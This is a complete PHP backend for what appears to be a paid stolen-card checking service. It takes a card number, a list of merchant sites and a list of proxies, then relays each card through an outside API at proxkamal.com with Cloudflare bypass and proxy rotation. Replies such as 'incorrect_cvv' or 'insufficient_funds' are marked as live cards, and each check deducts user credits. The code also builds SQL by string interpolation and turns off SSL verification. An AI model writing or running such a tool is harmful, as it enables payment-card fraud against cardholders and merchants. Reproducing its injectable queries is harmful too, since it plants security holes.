<?php
ob_start();
include('config.php');
session_start();

header('Content-Type: application/json');

// Disable PHP errors from showing up in output
ini_set('display_errors', 0);
error_reporting(E_ALL);

// Check session
if (!isset($_SESSION['user_id'])) {
    echo json_encode(['status' => 'error', 'response' => 'Session expired']);
    exit();
}

$user_id = $_SESSION['user_id'];

// Fetch credit
$sql = "SELECT credit FROM users WHERE id = '$user_id' LIMIT 1";
$result = mysqli_query($conn, $sql);
if (!$result || mysqli_num_rows($result) === 0) {
    echo json_encode(['status' => 'error', 'response' => 'User not found']);
    exit();
}
$user = mysqli_fetch_assoc($result);

if ($user['credit'] < 1) {
    echo json_encode(['status' => 'error', 'response' => 'Insufficient credit']);
    exit();
}

$cc      = $_POST['cc'] ?? '';
$sites   = json_decode($_POST['sites'], true);
$proxies = json_decode($_POST['proxies'], true);

if (empty($cc) || empty($sites) || empty($proxies)) {
    echo json_encode(['status' => 'error', 'response' => 'Missing input']);
    exit();
}

$approve_keywords = [
    "invalid_cvv", "incorrect_cvv", "insufficient_funds",
    "approved", "thank you", "success", "invalid_cvc",
    "incorrect_cvc", "incorrect_zip"
];

$final_result = null;

foreach ($sites as $site) {
    foreach ($proxies as $proxy) {
        $url = "https://proxkamal.com/kamal/sho.php?cc=$cc&site=$site&proxy=$proxy";

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 25);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $api_response_json = curl_exec($ch);
        $error = curl_error($ch);
        curl_close($ch);

        if ($error || empty($api_response_json)) {
            continue;
        }

        $api_response = json_decode($api_response_json, true);

        // If invalid JSON skip
        if (json_last_error() !== JSON_ERROR_NONE || !isset($api_response['Response'])) {
            continue;
        }

        $resp_text = strtolower($api_response['Response'] ?? '');

        if (strpos($resp_text, 'cloudflare bypass failed') !== false || strpos($resp_text, 'proxy dead') !== false) {
            continue;
        }

        $is_approved = false;
        foreach ($approve_keywords as $keyword) {
            if (strpos($resp_text, strtolower($keyword)) !== false) {
                $is_approved = true;
                break;
            }
        }

        mysqli_query($conn, "UPDATE users SET credit = credit - 1 WHERE id = '$user_id'");

        $status = $is_approved ? '✅' : '❌';

        $final_result = [
            'cc'       => $api_response['cc']       ?? $cc,
            'response' => $api_response['Response'] ?? 'No response',
            'price'    => $api_response['Price']    ?? '0',
            'gateway'  => $api_response['Gateway']  ?? 'N/A',
            'proxy'    => $proxy,
            'status'   => $status
        ];

        break 2;
    }
}

// If still no result
if (!$final_result) {
    mysqli_query($conn, "UPDATE users SET credit = credit - 1 WHERE id = '$user_id'");

    $final_result = [
        'cc'       => $cc,
        'response' => 'No valid response after trying all sites/proxies',
        'price'    => '0',
        'gateway'  => 'N/A',
        'proxy'    => 'N/A',
        'status'   => '❌'
    ];
}

// Clean output buffer to prevent extra output
ob_end_clean();
echo json_encode($final_result);
exit();
?>
